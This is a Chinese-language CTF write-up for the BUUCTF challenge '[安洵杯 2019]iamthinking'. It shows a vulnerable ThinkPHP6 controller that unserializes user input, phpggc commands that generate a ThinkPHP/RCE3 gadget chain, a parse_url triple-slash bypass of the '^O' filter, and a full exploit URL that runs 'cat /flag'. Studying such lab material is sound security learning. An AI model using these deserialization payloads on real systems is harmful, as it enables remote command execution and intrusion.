---
{"dg-publish":true,"dg-path":"安全/靶场/BUU_[安洵杯 2019]iamthinking.md","permalink":"/安全/靶场/BUU_[安洵杯 2019]iamthinking/","title":"BUU_[安洵杯 2019]iamthinking"}
---

利用dirsearch工具目录扫描发现网站源码：
![Pasted image 20241116143028.png](/img/user/picture/Pasted%20image%2020241116143028.png)

查看源码发现网站是基于thinkPHP6开发的
![Pasted image 20241116143116.png](/img/user/picture/Pasted%20image%2020241116143116.png)

根据提示有`/public/`目录
![Pasted image 20241116143149.png](/img/user/picture/Pasted%20image%2020241116143149.png)
查看源码：
```php
<?php  
namespace app\controller;  
use app\BaseController;  
  
class Index extends BaseController  
{  
    public function index()  
    {  
          
        echo "<img src='../test.jpg'"."/>";  
        $paylaod = @$_GET['payload'];  
        if(isset($paylaod))  
        {  
            $url = parse_url($_SERVER['REQUEST_URI']);  
            parse_str($url['query'],$query);  
            foreach($query as $value)  
            {  
                if(preg_match("/^O/i",$value))  
                {  
                    die('STOP HACKING');  
                    exit();  
                }  
            }  
            unserialize($paylaod);  
        }  
    }  
}
```


关于工具使用看这篇文章：
https://xz.aliyun.com/t/5450?time__1311=n4%2BxnieWqYwxyD0gxBqDqplDuAyrL5vUQx
发现存在反序列化，利用phpggc工具看是否有对应的漏洞
![Pasted image 20241116143317.png](/img/user/picture/Pasted%20image%2020241116143317.png)

![Pasted image 20241116143322.png](/img/user/picture/Pasted%20image%2020241116143322.png)


构造payload：
```shell
┌──(root㉿GMC)-[~/phpggc]
└─# ./phpggc  ThinkPHP/RCE3 system 'ls /' --url
O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A3%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A4%3A%22ls%20%2F%22%3B%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A3%3A%22key%22%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3Bs%3A6%3A%22%00%2A%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22anything%22%3B%7D%7D

┌──(root㉿GMC)-[~/phpggc]
└─# ./phpggc  ThinkPHP/RCE3 system 'cat /flag' --url
O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A3%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A9%3A%22cat%20%2Fflag%22%3B%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A3%3A%22key%22%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3Bs%3A6%3A%22%00%2A%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22anything%22%3B%7D%7D
```
注意这里要用工具自带的编码，不然很容易出错
![Pasted image 20241116145733.png](/img/user/picture/Pasted%20image%2020241116145733.png)
但是发现不行，原因在于程序中和有一布检查
```php
            $url = parse_url($_SERVER['REQUEST_URI']);  
            parse_str($url['query'],$query);  
            foreach($query as $value)  
            {  
                if(preg_match("/^O/i",$value))  
                {  
                    die('STOP HACKING');  
                    exit();  
                }  
            }
```

大致就是`parse_str`函数将url拆分为不同部分，然后检查传入的参数
这里可以绕过`parse_str`函数的检查，可以看这篇文章
https://www.cnblogs.com/Lee-404/p/12826352.html

![Pasted image 20241116150010.png](/img/user/picture/Pasted%20image%2020241116150010.png)

我们就拿到了flag：
```url
http://ebe05599-96df-4285-a0fd-3f0a2192544b.node5.buuoj.cn:81///public/?payload=O%3A41%3A%22League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%22%3A3%3A%7Bs%3A47%3A%22%00League%5CFlysystem%5CCached%5CStorage%5CPsr6Cache%00pool%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A26%3A%22League%5CFlysystem%5CDirectory%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00filesystem%22%3BO%3A14%3A%22think%5CValidate%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A9%3A%22cat%20%2Fflag%22%3B%7Ds%3A7%3A%22%00%2A%00path%22%3Bs%3A3%3A%22key%22%3B%7Ds%3A11%3A%22%00%2A%00autosave%22%3Bb%3A0%3Bs%3A6%3A%22%00%2A%00key%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A8%3A%22anything%22%3B%7D%7D
```

![Pasted image 20241116150034.png](/img/user/picture/Pasted%20image%2020241116150034.png)


